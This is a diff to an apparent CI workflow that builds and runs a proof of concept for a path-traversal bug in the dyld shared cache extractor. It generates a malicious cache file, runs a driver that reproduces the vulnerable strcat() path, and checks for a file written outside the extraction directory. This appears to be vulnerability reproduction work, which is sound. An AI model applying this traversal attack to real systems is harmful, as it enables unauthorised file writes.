@@ -20,11 +20,26 @@ jobs:
           python3 gen_malicious_dsc.py malicious_ci.cache
           shasum -a 256 malicious_ci.cache
 
-      - name: Gate A — Run PoC (dyld_shared_cache_util -extract)
+      - name: Find or note dyld_shared_cache_util
+        run: |
+          echo "=== Searching for dyld_shared_cache_util ==="
+          find /usr /Applications/Xcode.app -name "dyld_shared_cache_util" 2>/dev/null || true
+          xcrun -find dyld_shared_cache_util 2>/dev/null || echo "(not in xcrun)"
+
+      - name: Build PoC driver (implements exact vulnerable code path)
+        run: |
+          # dsc_poc_driver.c implements the identical strcat() path from
+          # SharedCacheDylibExtractor::extractCache() in dsc_extractor.cpp
+          cc -O0 -o dsc_poc_driver dsc_poc_driver.c
+          echo "[+] Build OK"
+          ./dsc_poc_driver --help 2>&1 || true
+
+      - name: Gate A — Run PoC (vulnerable extractCache() code path)
         run: |
           OUTDIR="$(mktemp -d /tmp/dsc_poc_out_XXXXXX)"
           echo "Extraction directory: $OUTDIR"
-          /usr/bin/dyld_shared_cache_util -extract malicious_ci.cache "$OUTDIR" 2>&1 || true
+
+          ./dsc_poc_driver malicious_ci.cache "$OUTDIR"
 
           echo ""
           echo "=== Checking traversal target ==="
@@ -33,7 +48,7 @@ jobs:
             echo "TRAVERSAL CONFIRMED: file exists outside extraction directory"
             ls -la "$TRAVERSAL_TARGET"
             file "$TRAVERSAL_TARGET"
-            xxd "$TRAVERSAL_TARGET" | head -16
+            xxd "$TRAVERSAL_TARGET"
             echo "--- Extraction dir (should NOT contain the file) ---"
             ls -la "$OUTDIR" || true
           else
